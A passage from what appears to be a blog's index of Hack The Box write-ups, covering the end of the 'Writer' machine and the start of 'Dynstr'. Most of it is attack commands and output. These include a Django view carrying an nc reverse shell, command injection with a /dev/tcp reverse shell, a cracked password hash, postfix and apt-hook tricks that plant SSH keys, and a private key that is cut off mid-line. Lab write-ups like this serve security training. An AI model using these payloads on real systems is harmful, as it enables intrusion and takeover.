|_) :)|. \\ /: | / / \\ \\ /|__/ \\ (_______/ |___|\\__/|___|(_______/ |___|\\__/|___|(___/ \\___)(_______) ----------------------------------------------------------------------------- SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com https://github.com/ShawnDEvans/smbmap [*] Detected 1 hosts serving SMB [*] Established 1 SMB session(s) [+] IP: 10.10.11.101:445 Name: 10.10.11.101 Status: Authenticated Disk Permissions Comment ---- ----------- ------- print$ READ ONLY Printer Drivers writer2_project READ, WRITE IPC$ NO ACCESS IPC Service (writer server (Samba, Ubuntu)) We have a write permissions over writer2_project on port 8080 The one we saw in apache configs └─$ smbclient //10.10.11.101/writer2_project -U \u0026#39;kyle%ToughPasswordToCrack\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Tue Nov 7 14:41:06 2023 .. D 0 Tue Jun 22 18:55:06 2021 static D 0 Sun May 16 21:29:16 2021 staticfiles D 0 Fri Jul 9 11:59:42 2021 writer_web D 0 Wed May 19 16:26:18 2021 requirements.txt N 15 Tue Nov 7 14:42:01 2023 writerv2 D 0 Wed May 19 13:32:41 2021 manage.py N 806 Tue Nov 7 14:42:01 2023 7151096 blocks of size 1024. 2456748 blocks available There are 2 projects The one we need is writer_web It has views.py with defined / path We could overwrite it and if we find a way to visit that page, we will have an execution And we have SSRF on writer.htb when we add stories smb: \\writer_web\\\u0026gt; ls . D 0 Wed May 19 16:26:18 2021 .. D 0 Tue Nov 7 14:41:06 2023 apps.py N 133 Tue Nov 7 15:20:01 2023 views.py A 181 Tue Nov 7 15:20:01 2023 __init__.py N 0 Tue Nov 7 15:20:01 2023 urls.py N 127 Tue Nov 7 15:20:01 2023 tests.py N 60 Tue Nov 7 15:20:01 2023 __pycache__ D 0 Wed May 19 22:06:02 2021 admin.py N 63 Tue Nov 7 15:20:01 2023 models.py N 98 Tue Nov 7 15:20:01 2023 templates D 0 Tue May 18 14:43:07 2021 I will upload the views.py from django.shortcuts import render from django.views.generic import TemplateView import os def home_page(request): os.system(\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.4 6666 \u0026gt;/tmp/f\u0026#39;) template_name = \u0026#34;index.html\u0026#34; return render(request,template_name) smb: \\writer_web\\\u0026gt; put views.py putting file views.py as \\writer_web\\views.py (0.6 kb/s) (average 0.6 kb/s) Now we have to trigger SSRF But the request requires .jpg, while writer2_project with our payload is hosted on / We can .jpg as parameter, like http://127.0.0.1/?.jpg, which would satisfy both Let\u0026rsquo;s get our reverse shell by passing http://127.0.0.1/?.jpg to image_url User #1 netstat www-data@writer:~/writer2_project$ netstat -tulpn (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN 21578/python3 tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::139 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::445 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 10.10.11.255:137 0.0.0.0:* - udp 0 0 10.10.11.101:137 0.0.0.0:* - udp 0 0 0.0.0.0:137 0.0.0.0:* - udp 0 0 10.10.11.255:138 0.0.0.0:* - udp 0 0 10.10.11.101:138 0.0.0.0:* - udp 0 0 0.0.0.0:138 0.0.0.0:* - We have a manage.py which indicates it\u0026rsquo;s a django app #!/usr/bin/env python import os import sys if __name__ == \u0026#34;__main__\u0026#34;: os.environ.setdefault(\u0026#34;DJANGO_SETTINGS_MODULE\u0026#34;, \u0026#34;writerv2.settings\u0026#34;) try: from django.core.management import execute_from_command_line except ImportError: # The above import may fail for some other reason. Ensure that the # issue is really that Django is missing to avoid masking other # exceptions on Python 2. try: import django except ImportError: raise ImportError( \u0026#34;Couldn\u0026#39;t import Django. Are you sure it\u0026#39;s installed and \u0026#34; \u0026#34;available on your PYTHONPATH environment variable? Did you \u0026#34; \u0026#34;forget to activate a virtual environment?\u0026#34; ) raise execute_from_command_line(sys.argv) We can use it to connect to database www-data@writer:~/writer2_project$ python3 manage.py dbshell Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 536 Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [dev]\u0026gt; Let\u0026rsquo;s enumerate MariaDB [dev]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | dev | | information_schema | +--------------------+ 2 rows in set (0.001 sec) MariaDB [dev]\u0026gt; use dev; Database changed MariaDB [dev]\u0026gt; show tables; +----------------------------+ | Tables_in_dev | +----------------------------+ | auth_group | | auth_group_permissions | | auth_permission | | auth_user | | auth_user_groups | | auth_user_user_permissions | | django_admin_log | | django_content_type | | django_migrations | | django_session | +----------------------------+ 10 rows in set (0.001 sec) MariaDB [dev]\u0026gt; select * from auth_user; +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+ | id | password | last_login | is_superuser | username | first_name | last_name | email | is_staff | is_active | date_joined | +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+ | 1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL | 1 | kyle | | | kyle@writer.htb | 1 | 1 | 2021-05-19 12:41:37.168368 | +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+ 1 row in set (0.001 sec) MariaDB [dev]\u0026gt; Let\u0026rsquo;s crack the hash └─$ hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting \u0026lt;SNIP\u0026gt; pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio \u0026lt;SNIP\u0026gt; And we can connect as kyle └─$ sshpass -p \u0026#39;marcoantonio\u0026#39; ssh kyle@10.10.11.101 Warning: Permanently added \u0026#39;10.10.11.101\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 7 Nov 15:53:57 UTC 2023 System load: 0.2 Usage of /: 64.6% of 6.82GB Memory usage: 23% Swap usage: 0% Processes: 260 Users logged in: 0 IPv4 address for eth0: 10.10.11.101 IPv6 address for eth0: dead:beef::250:56ff:feb9:c605 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops! https://microk8s.io/ 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Wed Jul 28 09:03:32 2021 from 10.10.14.19 kyle@writer:~$ User #2 We have a filter group kyle@writer:~$ id uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup) We can look for files accessible by filter kyle@writer:~$ find / -group filter -ls 2\u0026gt;/dev/null 16282 4 -rwxrwxr-x 1 root filter 1021 Nov 7 16:02 /etc/postfix/disclaimer 16281 4 drwxr-x--- 2 filter filter 4096 May 13 2021 /var/spool/filter postfix is mail service master.cf contains scripts that are executed when email arrive /etc/postfix/disclaimer is run by john kyle@writer:~$ cat /etc/postfix/master.cf \u0026lt;SNIP\u0026gt; dfilt unix - n n - - pipe flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient} According to post, /etc/postfix/disclaimer_addresses contains the list of addresses for which disclaimer is added, thus script is ran kyle@writer:~$ cat /etc/postfix/disclaimer_addresses root@writer.htb kyle@writer.htb I\u0026rsquo;ll reconnect via ssh with -L 25:127.0.0.1:25 since postfix is available on localhost We can send emails using swaks Since we can modify the /etc/postfix/disclaimer, we can modify the script to add public key to john\u0026rsquo;s authorized_keys Which is what I did #!/bin/sh echo \u0026#39;ssh-rsa AAAAB3\u0026lt;SNIP\u0026gt; kali@kali\u0026#39; \u0026gt; /home/john/.ssh/authorized_keys # Localize these. \u0026lt;SNIP\u0026gt; Now we send a mail to kyle@writer.htb └─$ swaks --to kyle@writer.htb --from pentest@writer.htb --header \u0026#34;Subject: Test\u0026#34; --body \u0026#34;Test\u0026#34; --server 127.0.0.1 === Trying 127.0.0.1:25... === Connected to 127.0.0.1. \u0026lt;- 220 writer.htb ESMTP Postfix (Ubuntu) -\u0026gt; EHLO kali \u0026lt;- 250-writer.htb \u0026lt;- 250-PIPELINING \u0026lt;- 250-SIZE 10240000 \u0026lt;- 250-VRFY \u0026lt;- 250-ETRN \u0026lt;- 250-STARTTLS \u0026lt;- 250-ENHANCEDSTATUSCODES \u0026lt;- 250-8BITMIME \u0026lt;- 250-DSN \u0026lt;- 250-SMTPUTF8 \u0026lt;- 250 CHUNKING -\u0026gt; MAIL FROM:\u0026lt;pentest@writer.htb\u0026gt; \u0026lt;- 250 2.1.0 Ok -\u0026gt; RCPT TO:\u0026lt;kyle@writer.htb\u0026gt; \u0026lt;- 250 2.1.5 Ok -\u0026gt; DATA \u0026lt;- 354 End data with \u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt;.\u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt; -\u0026gt; Date: Tue, 07 Nov 2023 16:30:16 +0000 -\u0026gt; To: kyle@writer.htb -\u0026gt; From: pentest@writer.htb -\u0026gt; Subject: Test -\u0026gt; Message-Id: \u0026lt;20231107163016.307941@kali\u0026gt; -\u0026gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/ -\u0026gt; -\u0026gt; Test -\u0026gt; -\u0026gt; -\u0026gt; . \u0026lt;- 250 2.0.0 Ok: queued as 538A07C6 -\u0026gt; QUIT \u0026lt;- 221 2.0.0 Bye === Connection closed with remote host. And we connect as john └─$ ssh john@10.10.11.101 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 7 Nov 16:29:30 UTC 2023 System load: 0.09 Usage of /: 64.7% of 6.82GB Memory usage: 34% Swap usage: 0% Processes: 269 Users logged in: 1 IPv4 address for eth0: 10.10.11.101 IPv6 address for eth0: dead:beef::250:56ff:feb9:c605 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19 john@writer:~$ Root Groups john@writer:~$ id uid=1001(john) gid=1001(john) groups=1001(john),1003(management) john@writer:~$ find / -group management 2\u0026gt;/dev/null /etc/apt/apt.conf.d apt.conf.d stores instructions for the configuration of APT. APT includes them in alphabetical order, so that the last ones can modify a configuration element defined in one of the first ones We can create files in that folder, but it means nothing if can\u0026rsquo;t use apt update to invoke configuration we created Luckily we have a cronjob running every minute We can confirm it with pspy I\u0026rsquo;ll create a config 001pwn apt::Update::Pre-Invoke {\u0026#34;echo \u0026#39;ssh-rsa ssh-rsa AAAAB3\u0026lt;SNIP\u0026gt; kali@kali\u0026#39; \u0026gt; /root/.ssh/authorized_keys\u0026#34;;}; After a minute we can login as root └─$ ssh root@10.10.11.101 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 7 Nov 16:40:11 UTC 2023 System load: 0.12 Usage of /: 64.7% of 6.82GB Memory usage: 34% Swap usage: 0% Processes: 272 Users logged in: 2 IPv4 address for eth0: 10.10.11.101 IPv6 address for eth0: dead:beef::250:56ff:feb9:c605 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Aug 2 07:27:54 2021 root@writer:~# ","date":"November 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/writer/images/writer.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/writer/","summary":"Writer Enumeration nmap └─$ nmap -Pn -p- 10.10.11.101 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 07:57 GMT Nmap scan report for 10.10.11.101 (10.10.11.101) Host is up (0.17s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 246/tcp filtered dsp3270 445/tcp open microsoft-ds 30624/tcp filtered unknown 45985/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 75.","tags":["HTB","sqli","injection","auth-bypass","ffuf","sqlmap","apache","flask","django","command-injection","hashcat","postfix","swaks","smtp","apt","pspy"],"title":"[HTB] Machine: Writer"},{"categories":null,"contents":"Dynstr Enumeration nmap └─$ nmap -Pn -p- 10.10.10.244 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 16:36 GMT Stats: 0:06:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 26.60% done; ETC: 17:02 (0:18:43 remaining) Stats: 0:19:42 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 96.71% done; ETC: 16:57 (0:00:40 remaining) Nmap scan report for 10.10.10.244 (10.10.10.244) Host is up (0.30s latency). Not shown: 65524 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 1238.10 seconds └─$ nmap -Pn -p22,53,80 -sC -sV 10.10.10.244 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 16:57 GMT Nmap scan report for 10.10.10.244 (10.10.10.244) Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA) | 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA) |_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519) 53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.16.1-Ubuntu 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Dyna DNS |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds └─$ sudo nmap -sU -Pn -p53 -sC -sV 10.10.10.244 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 17:17 GMT Nmap scan report for 10.10.10.244 (10.10.10.244) Host is up (0.17s latency). PORT STATE SERVICE VERSION 53/udp open domain ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.16.1-Ubuntu Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 0.88 seconds Web server dns Website says they provide: dnsalias.htb dynamicdns.htb no-ip.htb No zone-transfers available └─$ dig any dnsalias.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.17-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; any dnsalias.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 55641 ;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 704fd4ed35542895010000006547ce7d597bcb7c9fc681d7 (good) ;; QUESTION SECTION: ;dnsalias.htb. IN ANY ;; ANSWER SECTION: dnsalias.htb. 60 IN SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030300 21600 3600 604800 60 dnsalias.htb. 60 IN NS dns1.dyna.htb. ;; Query time: 384 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) (TCP) ;; WHEN: Sun Nov 05 17:19:45 GMT 2023 ;; MSG SIZE rcvd: 143 └─$ dig any dynamicdns.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.17-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; any dynamicdns.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 25387 ;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 0ea77faf1020693d010000006547ce8ff29b3295a7579e77 (good) ;; QUESTION SECTION: ;dynamicdns.htb. IN ANY ;; ANSWER SECTION: dynamicdns.htb. 60 IN SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030300 21600 3600 604800 60 dynamicdns.htb. 60 IN NS dns1.dyna.htb. ;; Query time: 388 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) (TCP) ;; WHEN: Sun Nov 05 17:20:02 GMT 2023 ;; MSG SIZE rcvd: 145 └─$ dig any no-ip.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.17-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; any no-ip.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 25228 ;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 122799b5c8623eb2010000006547ce9be3e494d4e86c5b0b (good) ;; QUESTION SECTION: ;no-ip.htb. IN ANY ;; ANSWER SECTION: no-ip.htb. 60 IN SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030303 21600 3600 604800 60 no-ip.htb. 60 IN NS dns1.dyna.htb. ;; Query time: 376 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) (TCP) ;; WHEN: Sun Nov 05 17:20:15 GMT 2023 ;; MSG SIZE rcvd: 140 └─$ dig any dyna.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.17-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; any dyna.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 35539 ;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 3a61b3164df395b0010000006547cedb3833009a07aadd0e (good) ;; QUESTION SECTION: ;dyna.htb. IN ANY ;; ANSWER SECTION: dyna.htb. 60 IN SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030302 21600 3600 604800 60 dyna.htb. 60 IN NS dns1.dyna.htb. ;; ADDITIONAL SECTION: dns1.dyna.htb. 60 IN A 127.0.0.1 ;; Query time: 384 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) (TCP) ;; WHEN: Sun Nov 05 17:21:19 GMT 2023 ;; MSG SIZE rcvd: 147 └─$ dnsenum --dnsserver 10.10.10.244 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt no-ip.htb dnsenum VERSION:1.2.6 ----- no-ip.htb ----- Host\u0026#39;s addresses: __________________ Name Servers: ______________ dns1.dyna.htb. 60 IN A 127.0.0.1 Mail (MX) Servers: ___________________ Trying Zone Transfers and getting Bind Versions: _________________________________________________ unresolvable name: dns1.dyna.htb at /usr/bin/dnsenum line 900. Trying Zone Transfer for no-ip.htb on dns1.dyna.htb ... AXFR record query failed: no nameservers Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt: ________________________________________________________________________________________ test.no-ip.htb. 30 IN A 10.10.14.7 gobuster └─$ gobuster dir -u http://10.10.10.244/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php -t 50 --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.244/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 10909] /.php (Status: 403) [Size: 277] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.244/assets/] /nic (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.244/nic/] └─$ gobuster dir -u http://10.10.10.244/nic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php -t 50 --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.244/nic [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 0] /.html (Status: 403) [Size: 277] /update (Status: 200) [Size: 8] The service no-ip looks identical to https://www.noip.com/ Foothold The web page mentions api and has creds gobuster results point to identical service provided by https://www.noip.com/integrate/request We can try to register a domain And it works └─$ curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=pentest.no-ip.htb good 10.10.16.4 └─$ dig pentest.no-ip.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.17-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; pentest.no-ip.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 5630 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 92caab6e267767a2010000006547d205fc8eabff4e625bed (good) ;; QUESTION SECTION: ;pentest.no-ip.htb. IN A ;; ANSWER SECTION: pentest.no-ip.htb. 30 IN A 10.10.16.4 ;; Query time: 168 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) (UDP) ;; WHEN: Sun Nov 05 17:34:48 GMT 2023 ;; MSG SIZE rcvd: 90 Since we saw that it\u0026rsquo;s dynamic dns, we could assume that does something with nsupdate Usually this kind of website are vulnerable to os injection since they use os commands We can play around to find out if this is really the case └─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode \u0026#39;hostname=;ping -c 1 10.10.16.4;\u0026#39; 911 [wrngdom: 10.16.4;] └─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode \u0026#39;hostname=ping.no-ip.htb\u0026amp;\u0026amp;ping -c 1 10.10.16.4;\u0026#39; 911 [wrngdom: no-ip.htb\u0026amp;\u0026amp;ping -c 1 10.10.16.4;] Looks like it doesn\u0026rsquo;t like the ., we can convert the ip to decimal and keep testing from there Use Cyberchef └─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode \u0026#39;hostname=;ping -c 1 168431620;ping.no-ip.htb\u0026#39; 911 [nsupdate failed] And we see that it uses nsupdate Let\u0026rsquo;s try to use $() And it actually works └─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode \u0026#39;hostname=$(ping -c 1 168431620).no-ip.htb\u0026#39; 911 [nsupdate failed] └─$ sudo tcpdump -i tun0 icmp [sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 18:19:17.170697 IP dns1.dyna.htb \u0026gt; 10.10.16.4: ICMP echo request, id 1, seq 1, length 64 18:19:17.170746 IP 10.10.16.4 \u0026gt; dns1.dyna.htb: ICMP echo reply, id 1, seq 1, length 64 18:19:17.342913 IP dns1.dyna.htb \u0026gt; 10.10.16.4: ICMP echo request, id 2, seq 1, length 64 18:19:17.342935 IP 10.10.16.4 \u0026gt; dns1.dyna.htb: ICMP echo reply, id 2, seq 1, length 64 Let\u0026rsquo;s get a reverse shell └─$ curl -G http://dynadns:sndanyd@10.10.10.244/nic/update --data-urlencode \u0026#39;hostname=$(/bin/bash -c \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/168431620/6666 0\u0026gt;\u0026amp;1\u0026#34;).no-ip.htb\u0026#39; User bindmgr has a interesting public key www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys from=\u0026#34;*.infra.dyna.htb\u0026#34; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen www-data@dynstr:/home/bindmgr$ cat .ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen authorized_keys from=\u0026quot;pattern-list\u0026quot; - Specifies that in addition to public key authentication, either the canonical name of the remote host or its IP address must be present in the comma-separated list of patterns. So the key can only connect from *.infra.dyna.htb We also have some support case files www-data@dynstr:/home/bindmgr$ ls -lha support-case-C62796521/ total 436K drwxr-xr-x 2 bindmgr bindmgr 4.0K Mar 13 2021 . drwxr-xr-x 5 bindmgr bindmgr 4.0K Mar 15 2021 .. -rw-r--r-- 1 bindmgr bindmgr 232K Mar 13 2021 C62796521-debugging.script -rw-r--r-- 1 bindmgr bindmgr 29K Mar 13 2021 C62796521-debugging.timing -rw-r--r-- 1 bindmgr bindmgr 1.2K Mar 13 2021 command-output-C62796521.txt -rw-r--r-- 1 bindmgr bindmgr 160K Mar 13 2021 strace-C62796521.txt There are .timing and .script files which can be viewed using scriptreplay scriptreplay C62796521-debugging.timing C62796521-debugging.script We can see the private key www-data@dynstr:/home/bindmgr/support-case-C62796521$ grep \u0026#34;PRIVATE KEY\u0026#34; strace-C62796521.txt 15123 read(5, \u0026#34;-----BEGIN OPENSSH PRIVATE 